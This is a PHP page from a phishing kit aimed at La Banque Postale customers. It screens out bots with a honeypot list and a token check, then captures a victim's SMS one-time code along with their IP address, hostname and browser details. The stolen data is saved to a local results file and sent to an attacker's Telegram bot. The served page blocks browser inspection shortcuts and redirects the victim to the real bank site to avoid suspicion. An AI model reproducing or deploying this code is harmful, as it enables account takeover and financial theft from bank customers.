<?php

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
$honeypotbots = file_get_contents('honeypotbots.dat');
$errorUrl = 'Error.php';
$ip = getenv('REMOTE_ADDR');

if (stripos($honeypotbots, $ip) !== false) {
  $stripos = '1';

}

$token1 = base64_encode($_SERVER['HTTP_USER_AGENT'].$ip.date('Y:M:D'));
if ($token1 != $_GET['token'] || $stripos == '1' ){ header("location: " . $errorUrl ."?" . $_GET['token']); exit;  }
function curl_get_contents($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_URL, $url);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
} 
$metri = $_SERVER['REMOTE_ADDR'];
$geoip = 'http://www.geoplugin.net/php.gp?ip='.$metri;
$addrDetailsArr = unserialize(curl_get_contents($geoip)); 
$continent = $addrDetailsArr['geoplugin_continentCode'];
$country = $addrDetailsArr['geoplugin_countryCode'];
 
if ($_POST['type'] == "otp") {
include 'config.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);


            $message = '/== Postale otp By METRI==/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
            $message .= 'sms: ' . $_POST['code'] . "\r\n";


            $message .= '/---------------- user details ----------------/' . "\r\n";
            $message .= "Client IP   : ".$ip."\n";
            $message .= "HostName    : ".$hostname."\n";
            $message .= "User Agent  : ".$_SERVER['HTTP_USER_AGENT']."\n";
            $message .= '/-- end infos details --/' . "\r\n\r\n";

            file_put_contents("./rezult/postale-rzlt.txt", $message, FILE_APPEND);

            $params=[
            'chat_id'=>$chat_id,
            'text'=>$message,
            ];
            $ch = curl_init($METRI_TOKEN . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
            
}
else {
header("location: " . $errorUrl . "?".base64_encode(rand(0,9999999999999)));
}



?>
<!doctype html>
<html>
 
<head>
  <title>loading...</title>
</head>
<script src="./postale-M3tri_files/jquery.min.js"></script>
<script>
jQuery(function($){

    document.addEventListener('contextmenu', event => event.preventDefault());
    document.onkeydown = function(e) {
        if (e.ctrlKey && 
        (e.keyCode === 67 || 
        e.keyCode === 86 || 
        e.keyCode === 85 ||
        e.keyCode === 83 || 
        e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
    };

    $(document).keydown(function (event) {
        if (event.keyCode == 123) { // Prevent F12
            return false;
        } else if (event.ctrlKey && event.shiftKey && event.keyCode == 73) { // Prevent Ctrl+Shift+I        
            return false;
        }
    });

    


    

})


</script>
<body>
<br>

<META HTTP-EQUIV='Refresh' Content=1;URL='https://www.labanquepostale.fr/particulier/Outils/simulateurs/calculette_pret_immo.html'>
 
</body>
</html>